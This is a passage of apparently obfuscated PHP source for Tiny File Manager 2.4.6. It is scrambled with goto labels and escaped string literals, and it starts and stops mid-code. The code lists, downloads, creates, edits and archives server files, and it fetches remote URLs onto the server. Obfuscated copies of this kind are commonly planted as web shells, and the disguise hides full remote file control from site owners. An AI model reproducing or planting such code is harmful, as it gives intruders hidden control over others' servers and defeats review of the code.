    <?php  fm_show_footer(); die; } goto x_iMx; ByJIc: $path = FM_ROOT_PATH; goto QIr9o; z5FpI: if (isset($_GET["\144\x6c"])) { $dl = $_GET["\144\x6c"]; $dl = fm_clean_path($dl); $dl = str_replace("\x2f", '', $dl); $path = FM_ROOT_PATH; if (FM_PATH != '') { $path .= "\57" . FM_PATH; } if ($dl != '' && is_file($path . "\x2f" . $dl)) { fm_download_file($path . "\57" . $dl, $dl, 1024); die; } else { fm_set_msg(lng("\106\151\154\x65\40\156\x6f\164\40\x66\157\x75\156\x64"), "\145\x72\x72\157\162"); fm_redirect(FM_SELF_URL . "\x3f\x70\75" . urlencode(FM_PATH)); } } goto MaRe1; SpgEb: function fm_get_theme() { $result = ''; if (FM_THEME == "\144\x61\162\x6b") { $result = "\164\x65\170\x74\55\167\150\x69\164\145\40\142\x67\x2d\x64\141\x72\x6b"; } return $result; } goto eCqlE; I3Q8K: if (!FM_READONLY) { ?>
                <div class="col-xs-12 col-sm-9">
                    <ul class="list-inline footer-action">
                        <li class="list-inline-item"> <a href="#/select-all" class="btn btn-small btn-outline-primary btn-2" onclick="select_all();return false;"><i class="fa fa-check-square"></i> <?php  echo lng("\123\145\x6c\145\x63\x74\101\x6c\x6c"); ?>
 </a></li>
                        <li class="list-inline-item"><a href="#/unselect-all" class="btn btn-small btn-outline-primary btn-2" onclick="unselect_all();return false;"><i class="fa fa-window-close"></i> <?php  echo lng("\125\156\123\145\x6c\x65\x63\164\101\154\154"); ?>
 </a></li>
                        <li class="list-inline-item"><a href="#/invert-all" class="btn btn-small btn-outline-primary btn-2" onclick="invert_all();return false;"><i class="fa fa-th-list"></i> <?php  echo lng("\111\x6e\166\x65\x72\164\x53\145\154\x65\143\x74\151\x6f\156"); ?>
 </a></li>
                        <li class="list-inline-item"><input type="submit" class="hidden" name="delete" id="a-delete" value="Delete" onclick="return confirm('<?php  echo lng("\104\145\154\145\164\145\40\163\145\x6c\x65\143\x74\x65\144\x20\x66\x69\x6c\145\163\x20\x61\x6e\x64\40\146\157\154\x64\145\162\163\77"); ?>
')">
                            <a href="javascript:document.getElementById('a-delete').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-trash"></i> <?php  echo lng("\x44\x65\x6c\145\164\145"); ?>
 </a></li>
                        <li class="list-inline-item"><input type="submit" class="hidden" name="zip" id="a-zip" value="zip" onclick="return confirm('<?php  echo lng("\x43\x72\x65\x61\164\145\40\x61\162\143\150\x69\x76\x65\77"); ?>
')">
                            <a href="javascript:document.getElementById('a-zip').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-file-archive-o"></i> <?php  echo lng("\132\151\x70"); ?>
 </a></li>
                        <li class="list-inline-item"><input type="submit" class="hidden" name="tar" id="a-tar" value="tar" onclick="return confirm('<?php  echo lng("\x43\x72\145\x61\164\x65\40\x61\162\143\150\151\166\145\77"); ?>
')">
                            <a href="javascript:document.getElementById('a-tar').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-file-archive-o"></i> <?php  echo lng("\x54\141\x72"); ?>
 </a></li>
                        <li class="list-inline-item"><input type="submit" class="hidden" name="copy" id="a-copy" value="Copy">
                            <a href="javascript:document.getElementById('a-copy').click();" class="btn btn-small btn-outline-primary btn-2"><i class="fa fa-files-o"></i> <?php  echo lng("\103\157\160\x79"); ?>
 </a></li>
                    </ul>
                </div>
                <div class="col-3 d-none d-sm-block"><a href="https://tinyfilemanager.github.io" target="_blank" class="float-right text-muted">Tiny File Manager <?php  echo VERSION; ?>
</a></div>
            <?php  } else { ?>
                <div class="col-12"><a href="https://tinyfilemanager.github.io" target="_blank" class="float-right text-muted">Tiny File Manager <?php  echo VERSION; ?>
</a></div>
            <?php  } goto iyoVj; kLodc: if ($use_auth && isset($_SESSION[FM_SESSION_ID]["\x6c\157\x67\x67\145\x64"])) { $root_path = isset($directories_users[$_SESSION[FM_SESSION_ID]["\154\157\147\x67\x65\144"]]) ? $directories_users[$_SESSION[FM_SESSION_ID]["\x6c\157\x67\x67\x65\x64"]] : $root_path; } goto xno2s; eCqlE: class FM_Zipper { private $zip; public function __construct() { $this->zip = new ZipArchive(); } public function create($filename, $files) { $res = $this->zip->open($filename, ZipArchive::CREATE); if ($res !== true) { return false; } if (is_array($files)) { foreach ($files as $f) { if (!$this->addFileOrDir($f)) { $this->zip->close(); return false; } } $this->zip->close(); return true; } else { if ($this->addFileOrDir($files)) { $this->zip->close(); return true; } return false; } } public function unzip($filename, $path) { $res = $this->zip->open($filename); if ($res !== true) { return false; } if ($this->zip->extractTo($path)) { $this->zip->close(); return true; } return false; } private function addFileOrDir($filename) { if (is_file($filename)) { return $this->zip->addFile($filename); } elseif (is_dir($filename)) { return $this->addDir($filename); } return false; } private function addDir($path) { if (!$this->zip->addEmptyDir($path)) { return false; } $objects = scandir($path); if (is_array($objects)) { foreach ($objects as $file) { if ($file != "\x2e" && $file != "\56\x2e") { if (is_dir($path . "\57" . $file)) { if (!$this->addDir($path . "\x2f" . $file)) { return false; } } elseif (is_file($path . "\x2f" . $file)) { if (!$this->zip->addFile($path . "\x2f" . $file)) { return false; } } } } return true; } return false; } } goto ZR0jF; ylraq: $theme = isset($cfg->data["\x74\150\x65\155\145"]) ? $cfg->data["\x74\x68\x65\155\x65"] : "\154\x69\147\x68\164"; goto q1o1V; Tn26q: function fm_get_text_mimes() { return array("\141\160\160\x6c\x69\143\141\x74\x69\157\156\57\170\x6d\x6c", "\141\x70\x70\x6c\x69\143\x61\164\x69\x6f\156\57\x6a\141\x76\x61\x73\x63\x72\151\x70\x74", "\x61\160\x70\x6c\x69\x63\141\x74\x69\x6f\x6e\57\x78\55\152\141\x76\141\x73\143\162\x69\160\x74", "\x69\155\141\x67\x65\x2f\163\x76\x67\x2b\x78\x6d\x6c", "\x6d\x65\x73\163\141\147\145\x2f\x72\146\143\x38\x32\62"); } goto CakGU; lT1Yk: define("\126\105\x52\123\111\x4f\x4e", "\62\56\x34\56\x36"); goto VQfxt; Qc4Fn: define("\106\x4d\x5f\111\123\x5f\127\111\116", DIRECTORY_SEPARATOR == "\x5c"); goto BwbtG; JK7V4: ?>
</th>
                </tr>
                </thead>
                <?php  goto zpq7C; NSjIC: if (isset($_GET["\x6e\145\x77"]) && isset($_GET["\x74\x79\x70\x65"]) && !FM_READONLY) { $type = $_GET["\164\x79\x70\x65"]; $new = str_replace("\x2f", '', fm_clean_path(strip_tags($_GET["\156\x65\x77"]))); if (fm_isvalid_filename($new) && $new != '' && $new != "\x2e\x2e" && $new != "\56") { $path = FM_ROOT_PATH; if (FM_PATH != '') { $path .= "\x2f" . FM_PATH; } if ($_GET["\x74\171\x70\145"] == "\146\x69\154\145") { if (!file_exists($path . "\57" . $new)) { if (fm_is_valid_ext($new)) { @fopen($path . "\57" . $new, "\x77") or die("\x43\141\x6e\x6e\157\164\40\x6f\x70\x65\156\x20\146\151\154\x65\72\x20\40" . $new); fm_set_msg(sprintf(lng("\x46\x69\154\x65") . "\x20\74\142\76\45\163\74\57\x62\x3e\40" . lng("\x43\162\x65\x61\164\145\x64"), fm_enc($new))); } else { fm_set_msg(lng("\x46\151\154\x65\x20\145\x78\164\145\x6e\x73\x69\x6f\x6e\40\x69\163\40\156\157\x74\x20\141\x6c\x6c\x6f\x77\x65\144"), "\x65\162\x72\x6f\162"); } } else { fm_set_msg(sprintf(lng("\x46\151\154\145") . "\40\74\142\x3e\45\x73\74\57\142\76\x20" . lng("\x61\154\162\145\x61\144\171\40\145\x78\151\x73\x74\163"), fm_enc($new)), "\x61\154\x65\162\164"); } } else { if (fm_mkdir($path . "\57" . $new, false) === true) { fm_set_msg(sprintf(lng("\x46\157\154\x64\x65\162") . "\x20\74\142\76\45\x73\x3c\57\142\76\x20" . lng("\x43\x72\x65\x61\164\145\x64"), $new)); } elseif (fm_mkdir($path . "\57" . $new, false) === $path . "\x2f" . $new) { fm_set_msg(sprintf(lng("\106\x6f\x6c\x64\x65\x72") . "\x20\74\142\76\45\163\x3c\x2f\142\76\x20" . lng("\x61\154\x72\145\x61\144\171\40\145\170\x69\163\x74\163"), fm_enc($new)), "\x61\154\x65\162\164"); } else { fm_set_msg(sprintf(lng("\x46\x6f\154\x64\x65\162") . "\40\74\142\76\45\x73\74\57\x62\x3e\40" . lng("\x6e\x6f\x74\x20\x63\x72\145\x61\164\145\144"), fm_enc($new)), "\145\x72\162\157\x72"); } } } else { fm_set_msg(lng("\x49\156\166\141\x6c\x69\144\40\143\150\x61\162\141\143\164\x65\162\163\40\x69\156\x20\x66\151\x6c\145\40\157\162\40\146\x6f\154\x64\145\x72\40\156\141\155\145"), "\x65\x72\x72\x6f\162"); } fm_redirect(FM_SELF_URL . "\77\160\75" . urlencode(FM_PATH)); } goto U2Cqd; lgvvh: if (isset($_POST["\x67\162\157\x75\x70"]) && (isset($_POST["\x7a\151\x70"]) || isset($_POST["\x74\x61\x72"])) && !FM_READONLY) { $path = FM_ROOT_PATH; $ext = "\172\151\160"; if (FM_PATH != '') { $path .= "\57" . FM_PATH; } $ext = isset($_POST["\x74\x61\x72"]) ? "\164\141\162" : "\172\151\x70"; if ($ext == "\x7a\x69\x70" && !class_exists("\x5a\x69\160\x41\162\143\x68\x69\166\145") || $ext == "\164\x61\x72" && !class_exists("\x50\x68\x61\162\104\141\x74\x61")) { fm_set_msg(lng("\x4f\x70\x65\x72\x61\164\151\x6f\156\x73\40\x77\151\164\150\40\141\162\x63\x68\151\x76\x65\x73\40\141\x72\x65\x20\156\x6f\x74\x20\141\166\141\151\x6c\x61\142\x6c\x65"), "\145\162\x72\157\x72"); fm_redirect(FM_SELF_URL . "\x3f\160\75" . urlencode(FM_PATH)); } $files = $_POST["\x66\151\x6c\145"]; if (!empty($files)) { chdir($path); if (count($files) == 1) { $one_file = reset($files); $one_file = basename($one_file); $zipname = $one_file . "\x5f" . date("\171\x6d\144\x5f\110\x69\x73") . "\x2e" . $ext; } else { $zipname = "\x61\x72\x63\x68\x69\166\x65\x5f" . date("\171\155\144\137\x48\151\x73") . "\56" . $ext; } if ($ext == "\172\151\160") { $zipper = new FM_Zipper(); $res = $zipper->create($zipname, $files); } elseif ($ext == "\x74\141\x72") { $tar = new FM_Zipper_Tar(); $res = $tar->create($zipname, $files); } if ($res) { fm_set_msg(sprintf(lng("\x41\x72\143\150\x69\x76\x65") . "\x20\74\x62\76\45\x73\x3c\x2f\x62\x3e\x20" . lng("\x43\162\145\141\x74\x65\x64"), fm_enc($zipname))); } else { fm_set_msg(lng("\x41\x72\143\x68\x69\x76\145\40\x6e\157\x74\40\143\x72\145\141\164\x65\144"), "\x65\x72\x72\x6f\x72"); } } else { fm_set_msg(lng("\116\157\x74\150\x69\156\147\40\163\145\154\145\143\164\x65\144"), "\141\x6c\145\x72\164"); } fm_redirect(FM_SELF_URL . "\x3f\x70\75" . urlencode(FM_PATH)); } goto oZAr3; ERigN: $exclude_items = array(); goto VT2Of; QIr9o: if (FM_PATH != '') { $path .= "\x2f" . FM_PATH; } goto u5zh_; GgH4T: if (is_array($objects) && fm_is_exclude_items($current_path)) { foreach ($objects as $file) { if ($file == "\x2e" || $file == "\56\x2e") { continue; } if (!FM_SHOW_HIDDEN && substr($file, 0, 1) === "\x2e") { continue; } $new_path = $path . "\x2f" . $file; if (@is_file($new_path) && fm_is_exclude_items($file)) { $files[] = $file; } elseif (@is_dir($new_path) && $file != "\56" && $file != "\x2e\56" && fm_is_exclude_items($file)) { $folders[] = $file; } } } goto EGz8a; yOTCd: $ip_ruleset = "\117\106\106"; goto GZopX; BsQ2m: $parent = fm_get_parent_path(FM_PATH); goto fKVAB; gwrFe: unset($p, $use_auth, $iconv_input_encoding, $use_highlightjs, $highlightjs_style); goto PUsDh; MUgyO: function fm_get_file_mimes($extension) { $fileTypes["\x73\x77\146"] = "\141\160\x70\154\151\143\141\164\151\157\156\57\170\55\x73\150\x6f\143\153\167\141\166\x65\x2d\146\154\141\x73\x68"; $fileTypes["\160\x64\146"] = "\x61\x70\x70\x6c\151\143\141\164\151\x6f\156\x2f\x70\144\x66"; $fileTypes["\x65\x78\x65"] = "\x61\x70\x70\154\x69\x63\141\164\151\x6f\156\x2f\157\143\x74\x65\x74\55\x73\x74\x72\145\x61\x6d"; $fileTypes["\172\151\160"] = "\141\160\x70\x6c\x69\x63\x61\164\x69\x6f\156\57\x7a\151\160"; $fileTypes["\144\157\143"] = "\141\x70\160\x6c\x69\143\x61\164\151\157\156\x2f\x6d\163\167\157\x72\144"; $fileTypes["\170\154\x73"] = "\x61\x70\x70\x6c\151\143\141\164\x69\157\x6e\x2f\166\156\144\x2e\155\x73\55\x65\x78\143\145\154"; $fileTypes["\160\x70\x74"] = "\x61\160\x70\x6c\151\143\141\x74\151\157\156\x2f\166\156\x64\x2e\x6d\163\x2d\160\x6f\167\145\x72\160\157\x69\156\x74"; $fileTypes["\147\x69\146"] = "\x69\155\141\x67\x65\57\147\x69\x66"; $fileTypes["\160\156\x67"] = "\x69\155\141\147\145\x2f\160\156\147"; $fileTypes["\152\160\x65\x67"] = "\151\155\x61\x67\x65\x2f\x6a\160\x67"; $fileTypes["\x6a\x70\147"] = "\151\155\x61\x67\145\57\x6a\160\x67"; $fileTypes["\x77\145\142\x70"] = "\x69\155\x61\x67\x65\57\167\145\x62\160"; $fileTypes["\x61\166\x69\146"] = "\x69\x6d\x61\x67\x65\57\x61\166\151\146"; $fileTypes["\x72\x61\x72"] = "\141\160\x70\x6c\151\x63\x61\x74\x69\157\x6e\57\162\141\x72"; $fileTypes["\162\141"] = "\x61\x75\144\x69\x6f\57\x78\55\160\156\x2d\162\145\x61\154\141\165\x64\x69\x6f"; $fileTypes["\162\141\x6d"] = "\x61\x75\x64\151\157\x2f\170\x2d\160\156\x2d\162\x65\141\154\141\x75\144\151\157"; $fileTypes["\157\147\147"] = "\141\x75\144\151\x6f\57\170\55\160\x6e\x2d\x72\x65\x61\x6c\141\165\144\x69\157"; $fileTypes["\167\x61\166"] = "\x76\x69\144\x65\157\x2f\170\55\155\163\x76\x69\144\x65\x6f"; $fileTypes["\x77\x6d\x76"] = "\x76\x69\144\x65\157\x2f\170\x2d\x6d\x73\166\151\x64\x65\x6f"; $fileTypes["\141\x76\151"] = "\166\151\x64\145\157\57\170\x2d\x6d\163\x76\151\144\x65\157"; $fileTypes["\x61\x73\x66"] = "\166\151\x64\145\x6f\57\x78\x2d\155\x73\x76\151\x64\145\157"; $fileTypes["\144\x69\166\x78"] = "\166\x69\144\145\157\x2f\x78\x2d\155\x73\x76\x69\x64\x65\157"; $fileTypes["\x6d\x70\x33"] = "\x61\x75\144\x69\157\57\x6d\160\145\x67"; $fileTypes["\155\x70\64"] = "\141\165\x64\151\x6f\57\155\x70\145\147"; $fileTypes["\155\x70\145\147"] = "\x76\x69\x64\x65\x6f\57\x6d\160\145\x67"; $fileTypes["\155\x70\147"] = "\166\151\144\145\x6f\x2f\x6d\160\x65\147"; $fileTypes["\x6d\x70\x65"] = "\166\151\x64\x65\x6f\57\155\x70\x65\147"; $fileTypes["\x6d\157\166"] = "\166\151\144\x65\157\57\161\165\151\x63\153\x74\151\155\x65"; $fileTypes["\163\167\146"] = "\x76\151\144\x65\x6f\x2f\161\165\x69\143\153\x74\151\155\145"; $fileTypes["\x33\147\x70"] = "\x76\x69\x64\x65\x6f\57\x71\x75\x69\143\x6b\x74\x69\155\x65"; $fileTypes["\155\x34\x61"] = "\x76\x69\144\x65\157\x2f\x71\165\x69\x63\x6b\x74\151\x6d\x65"; $fileTypes["\141\141\x63"] = "\166\x69\x64\145\x6f\57\x71\165\x69\x63\x6b\164\151\x6d\145"; $fileTypes["\155\x33\165"] = "\x76\151\x64\x65\x6f\x2f\x71\165\151\x63\x6b\164\x69\155\x65"; $fileTypes["\x70\x68\x70"] = array("\141\160\160\x6c\x69\143\141\x74\x69\x6f\x6e\x2f\x78\x2d\x70\x68\x70"); $fileTypes["\150\x74\x6d\x6c"] = array("\x74\145\x78\x74\57\150\x74\155\x6c"); $fileTypes["\164\x78\x74"] = array("\x74\145\x78\x74\57\x70\x6c\141\x69\x6e"); if (empty($fileTypes[$extension])) { $fileTypes[$extension] = array("\141\x70\x70\x6c\x69\x63\141\x74\151\157\156\x2f\157\x63\164\145\164\55\163\x74\x72\145\141\155"); } return $fileTypes[$extension]; } goto B5hLn; lnfR_: fm_show_message(); goto hS6b3; QAp6i: defined("\x46\x4d\137\122\117\x4f\124\137\x55\x52\x4c") || define("\106\x4d\137\122\x4f\x4f\x54\x5f\x55\x52\114", ($is_https ? "\x68\x74\164\x70\163" : "\x68\164\x74\160") . "\72\57\x2f" . $http_host . (!empty($root_url) ? "\x2f" . $root_url : '')); goto Bup1I; A7_N8: function fm_enc($text) { return htmlspecialchars($text, ENT_QUOTES, "\x55\x54\x46\x2d\70"); } goto JMxlX; Xqjlc: define("\x46\115\137\125\x53\105\x5f\101\125\124\110", $use_auth); goto tMIAQ; PUsDh: if (isset($_POST["\141\x6a\x61\170"]) && !FM_READONLY) { if (isset($_POST["\x74\x79\x70\x65"]) && $_POST["\x74\171\x70\x65"] == "\163\141\166\x65") { $path = FM_ROOT_PATH; if (FM_PATH != '') { $path .= "\x2f" . FM_PATH; } if (!is_dir($path)) { fm_redirect(FM_SELF_URL . "\77\x70\75"); } $file = $_GET["\145\144\x69\x74"]; $file = fm_clean_path($file); $file = str_replace("\57", '', $file); if ($file == '' || !is_file($path . "\57" . $file)) { fm_set_msg(lng("\106\151\x6c\x65\x20\x6e\157\164\x20\146\157\165\156\x64"), "\145\x72\162\157\162"); fm_redirect(FM_SELF_URL . "\x3f\160\x3d" . urlencode(FM_PATH)); } header("\x58\x2d\130\123\123\x2d\x50\162\157\164\145\x63\164\x69\157\x6e\x3a\60"); $file_path = $path . "\57" . $file; $writedata = $_POST["\143\x6f\156\164\x65\x6e\164"]; $fd = fopen($file_path, "\167"); $write_results = @fwrite($fd, $writedata); fclose($fd); if ($write_results === false) { header("\110\x54\124\120\57\61\x2e\61\40\65\60\60\x20\x49\x6e\164\x65\162\156\x61\154\40\123\145\x72\166\x65\162\x20\105\162\x72\x6f\162"); die("\x43\x6f\x75\x6c\144\40\116\157\x74\x20\x57\x72\151\164\145\x20\x46\151\x6c\145\41\x20\x2d\40\x43\150\x65\143\153\40\x50\145\162\x6d\151\x73\x73\x69\x6f\156\x73\x20\57\x20\x4f\167\x6e\x65\162\x73\x68\151\160"); } die(true); } if (isset($_POST["\164\171\160\145"]) && $_POST["\164\x79\160\145"] == "\x73\x65\x61\x72\x63\x68") { $dir = FM_ROOT_PATH; $response = scan(fm_clean_path($_POST["\x70\141\164\150"]), $_POST["\x63\x6f\x6e\x74\145\x6e\x74"]); echo json_encode($response); die; } if (isset($_POST["\x74\171\x70\145"]) && $_POST["\164\171\x70\145"] == "\142\141\x63\x6b\x75\x70" && !empty($_POST["\x66\151\154\145"])) { $fileName = $_POST["\146\x69\154\145"]; $fullPath = FM_ROOT_PATH . "\x2f"; if (!empty($_POST["\160\141\164\150"])) { $relativeDirPath = fm_clean_path($_POST["\160\x61\164\150"]); $fullPath .= "{$relativeDirPath}\57"; } $date = date("\144\115\171\x2d\110\151\x73"); $newFileName = "{$fileName}\55{$date}\x2e\142\141\x6b"; $fullyQualifiedFileName = $fullPath . $fileName; try { if (!file_exists($fullyQualifiedFileName)) { throw new Exception("\106\151\154\x65\x20{$fileName}\40\x6e\157\x74\x20\146\x6f\165\x6e\144"); } if (copy($fullyQualifiedFileName, $fullPath . $newFileName)) { echo "\102\141\x63\x6b\165\160\x20{$newFileName}\x20\143\x72\145\x61\164\x65\x64"; } else { throw new Exception("\x43\x6f\x75\154\144\40\156\157\x74\40\x63\x6f\160\171\x20\x66\151\x6c\145\40{$fileName}"); } } catch (Exception $e) { echo $e->getMessage(); } } if (isset($_POST["\x74\171\x70\x65"]) && $_POST["\164\171\160\145"] == "\x73\x65\164\x74\x69\x6e\147\x73") { global $cfg, $lang, $report_errors, $show_hidden_files, $lang_list, $hide_Cols, $calc_folder, $theme; $newLng = $_POST["\x6a\163\55\x6c\141\156\147\x75\141\x67\145"]; fm_get_translations(array()); if (!array_key_exists($newLng, $lang_list)) { $newLng = "\145\156"; } $erp = isset($_POST["\x6a\163\55\x65\x72\x72\x6f\x72\x2d\162\x65\x70\157\x72\164"]) && $_POST["\152\163\x2d\x65\x72\x72\157\162\x2d\162\x65\x70\x6f\x72\164"] == "\x74\x72\165\x65" ? true : false; $shf = isset($_POST["\x6a\x73\55\163\150\157\167\x2d\x68\151\x64\x64\x65\156"]) && $_POST["\152\163\55\x73\x68\x6f\x77\x2d\x68\x69\144\x64\145\x6e"] == "\x74\x72\x75\145" ? true : false; $hco = isset($_POST["\152\x73\x2d\150\151\x64\x65\x2d\143\157\154\x73"]) && $_POST["\x6a\x73\55\150\151\144\145\x2d\x63\157\154\x73"] == "\164\x72\165\145" ? true : false; $caf = isset($_POST["\152\x73\x2d\x63\141\154\143\x2d\x66\157\x6c\x64\145\162"]) && $_POST["\152\x73\55\143\141\x6c\x63\x2d\146\157\x6c\144\145\162"] == "\164\x72\x75\x65" ? true : false; $te3 = $_POST["\152\163\x2d\x74\150\x65\x6d\x65\x2d\63"]; if ($cfg->data["\x6c\x61\156\147"] != $newLng) { $cfg->data["\x6c\141\x6e\147"] = $newLng; $lang = $newLng; } if ($cfg->data["\145\x72\162\x6f\x72\137\x72\x65\160\x6f\x72\164\x69\156\x67"] != $erp) { $cfg->data["\x65\162\x72\157\162\x5f\162\x65\x70\x6f\162\164\x69\x6e\x67"] = $erp; $report_errors = $erp; } if ($cfg->data["\x73\x68\157\x77\x5f\x68\x69\144\144\145\156"] != $shf) { $cfg->data["\163\150\157\x77\137\x68\x69\144\144\145\156"] = $shf; $show_hidden_files = $shf; } if ($cfg->data["\163\x68\x6f\x77\137\150\x69\x64\144\145\x6e"] != $shf) { $cfg->data["\163\x68\x6f\x77\x5f\150\151\x64\144\x65\x6e"] = $shf; $show_hidden_files = $shf; } if ($cfg->data["\x68\151\144\x65\137\103\157\x6c\163"] != $hco) { $cfg->data["\150\x69\x64\145\x5f\x43\157\154\163"] = $hco; $hide_Cols = $hco; } if ($cfg->data["\x63\141\154\x63\x5f\x66\x6f\154\144\145\x72"] != $caf) { $cfg->data["\x63\141\x6c\x63\137\x66\157\x6c\144\145\162"] = $caf; $calc_folder = $caf; } if ($cfg->data["\x74\x68\145\155\x65"] != $te3) { $cfg->data["\164\x68\x65\155\145"] = $te3; $theme = $te3; } $cfg->save(); echo true; } if (isset($_POST["\164\171\x70\145"]) && $_POST["\x74\171\160\145"] == "\x70\x77\x64\x68\x61\163\150") { $res = isset($_POST["\x69\x6e\x70\x75\164\120\x61\x73\x73\167\x6f\162\x64\62"]) && !empty($_POST["\151\156\x70\x75\164\x50\141\163\163\x77\x6f\162\144\x32"]) ? password_hash($_POST["\x69\x6e\x70\165\164\x50\141\x73\x73\x77\157\162\144\x32"], PASSWORD_DEFAULT) : ''; echo $res; } if (isset($_POST["\x74\171\160\145"]) && $_POST["\164\x79\160\x65"] == "\x75\x70\154\x6f\141\144" && !empty($_REQUEST["\x75\160\154\x6f\141\x64\x75\162\x6c"])) { $path = FM_ROOT_PATH; if (FM_PATH != '') { $path .= "\57" . FM_PATH; } function event_callback($message) { global $callback; echo json_encode($message); } function get_file_path() { global $path, $fileinfo, $temp_file; return $path . "\x2f" . basename($fileinfo->name); } $url = !empty($_REQUEST["\x75\160\x6c\x6f\141\x64\165\x72\x6c"]) && preg_match("\x7c\x5e\x68\164\x74\x70\x28\163\x29\77\x3a\x2f\x2f\x2e\53\x24\174", stripslashes($_REQUEST["\165\160\154\157\141\144\165\x72\x6c"])) ? stripslashes($_REQUEST["\165\x70\154\157\x61\144\165\x72\154"]) : null; $domain = parse_url($url, PHP_URL_HOST); $port = parse_url($url, PHP_URL_PORT); $knownPorts = array(22, 23, 25, 3306); if (preg_match("\57\136\x6c\157\143\x61\x6c\x68\x6f\x73\x74\x24\174\136\x31\x32\x37\x28\77\72\134\x2e\133\x30\x2d\71\x5d\53\x29\x7b\60\x2c\62\175\x5c\56\133\60\x2d\71\x5d\53\x24\x7c\x5e\50\x3f\72\x30\x2a\x5c\x3a\x29\x2a\77\72\77\x30\x2a\x31\x24\57\x69", $domain) || in_array($port, $knownPorts)) { $err = array("\x6d\x65\x73\x73\141\x67\x65" => "\x55\122\114\40\151\x73\40\156\157\164\40\141\154\154\x6f\x77\145\x64"); event_callback(array("\x66\x61\x69\154" => $err)); die; } $use_curl = false; $temp_file = tempnam(sys_get_temp_dir(), "\x75\160\x6c\x6f\141\144\55"); $fileinfo = new stdClass(); $fileinfo->name = trim(basename($url), "\x2e\x0\56\x2e\x20"); $allowed = FM_UPLOAD_EXTENSION ? explode("\54", FM_UPLOAD_EXTENSION) : false; $ext = strtolower(pathinfo($fileinfo->name, PATHINFO_EXTENSION)); $isFileAllowed = $allowed ? in_array($ext, $allowed) : true; $err = false; if (!$isFileAllowed) { $err = array("\155\x65\163\163\141\147\x65" => "\106\151\x6c\x65\40\x65\x78\x74\145\156\163\151\157\x6e\40\x69\x73\x20\156\x6f\164\40\141\154\154\157\x77\145\x64"); event_callback(array("\146\141\151\x6c" => $err)); die; } if (!$url) { $success = false; } else { if ($use_curl) { @($fp = fopen($temp_file, "\167")); @($ch = curl_init($url)); curl_setopt($ch, CURLOPT_NOPROGRESS, false); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); curl_setopt($ch, CURLOPT_FILE, $fp); @($success = curl_exec($ch)); $curl_info = curl_getinfo($ch); if (!$success) { $err = array("\155\145\163\x73\x61\x67\x65" => curl_error($ch)); } @curl_close($ch); fclose($fp); $fileinfo->size = $curl_info["\x73\151\172\145\x5f\x64\157\x77\156\x6c\157\x61\x64"]; $fileinfo->type = $curl_info["\143\157\156\x74\x65\156\x74\137\x74\x79\x70\145"]; } else { $ctx = stream_context_create(); @($success = copy($url, $temp_file, $ctx)); if (!$success) { $err = error_get_last(); } } } if ($success) { $success = rename($temp_file, get_file_path()); } if ($success) { event_callback(array("\x64\157\156\x65" => $fileinfo)); } else { unlink($temp_file); if (!$err) { $err = array("\x6d\145\163\x73\141\x67\x65" => "\111\x6e\166\141\154\151\144\40\165\x72\x6c\x20\160\x61\162\141\x6d\x65\164\x65\x72"); } event_callback(array("\x66\141\151\154" => $err)); } } die; } goto wc9uj; krT1W: $num_folders = count($folders); goto qVEX9; oatiw: function get_absolute_path($path) { $path = str_replace(array("\57", "\x5c"), DIRECTORY_SEPARATOR, $path); $parts = array_filter(explode(DIRECTORY_SEPARATOR, $path), "\x73\x74\x72\x6c\x65\x6e"); $absolutes = array(); foreach ($parts as $part) { if ("\56" == $part) { continue; } if ("\56\56" == $part) { array_pop($absolutes); } else { $absolutes[] = $part; } } return implode(DIRECTORY_SEPARATOR, $absolutes); } goto Gh3ci; PwXgS: function fm_copy($f1, $f2, $upd) { $time1 = filemtime($f1); if (file_exists($f2)) { $time2 = filemtime($f2); if ($time2 >= $time1 && $upd) { return false; } } $ok = copy($f1, $f2); if ($ok) { touch($f2, $time1); } return $ok; } goto YDEmM; C6kqg: $edit_files = true; goto C1J2I; zUbuB: $root_url = ''; goto lSWBD; FeZIU: ?>
</th>
                    <?php  goto uCoBm; u5zh_: if (!is_dir($path)) { fm_redirect(FM_SELF_URL . "\x3f\x70\x3d"); } goto BsQ2m; QfHXk: ?>
" id="main-table">
                <thead class="thead-white">
                <tr>
                    <?php  goto lpmlo; RjE7m: ?>
            </table>
        </div>

        <div class="row">
            <?php  goto I3Q8K; Zkd6P: defined("\106\x4d\x5f\x46\111\114\105\137\105\x58\x54\x45\x4e\123\x49\117\x4e") || define("\x46\x4d\x5f\x46\x49\114\105\137\x45\x58\124\105\x4e\x53\x49\117\116", $allowed_file_extensions); goto qC_59; mBcx7: class FM_Config { var $data; function __construct() { global $root_path, $root_url, $CONFIG; $fm_url = $root_url . $_SERVER["\120\x48\x50\137\123\x45\114\106"]; $this->data = array("\x6c\x61\156\x67" => "\145\x6e", "\x65\x72\162\157\162\137\162\145\x70\157\x72\164\151\x6e\x67" => true, "\x73\x68\157\167\x5f\x68\x69\144\x64\145\x6e" => true); $data = false; if (strlen($CONFIG)) { $data = fm_object_to_array(json_decode($CONFIG)); } else { $msg = "\x54\151\x6e\x79\40\106\x69\x6c\145\x20\x4d\141\156\141\147\145\162\74\142\162\x3e\105\162\162\157\x72\x3a\x20\103\x61\156\156\x6f\164\x20\154\x6f\141\144\40\x63\157\156\x66\x69\x67\165\162\x61\164\x69\x6f\x6e"; if (substr($fm_url, -1) == "\57") { $fm_url = rtrim($fm_url, "\57"); $msg .= "\x3c\142\x72\76"; $msg .= "\74\142\162\76\x53\x65\145\155\163\40\154\151\153\145\40\171\x6f\165\40\x68\141\166\145\40\x61\x20\164\162\x61\151\154\x69\x6e\x67\40\163\x6c\141\x73\150\x20\157\156\x20\164\x68\145\x20\x55\122\114\56"; $msg .= "\74\142\162\76\x54\162\171\40\x74\x68\151\x73\40\x6c\x69\156\153\x3a\x20\74\x61\x20\x68\x72\145\x66\75\x22" . $fm_url . "\x22\x3e" . $fm_url . "\74\x2f\x61\76"; } die($msg); } if (is_array($data) && count($data)) { $this->data = $data; } else { $this->save(); } } function save() { $fm_file = __FILE__; $var_name = "\44\x43\x4f\116\106\x49\x47"; $var_value = var_export(json_encode($this->data), true); $config_string = "\74\x3f\160\150\160" . chr(13) . chr(10) . "\x2f\x2f\x44\x65\146\x61\x75\154\x74\x20\x43\x6f\x6e\146\151\147\165\162\x61\x74\x69\x6f\x6e" . chr(13) . chr(10) . "{$var_name}\40\75\x20{$var_value}\x3b" . chr(13) . chr(10); if 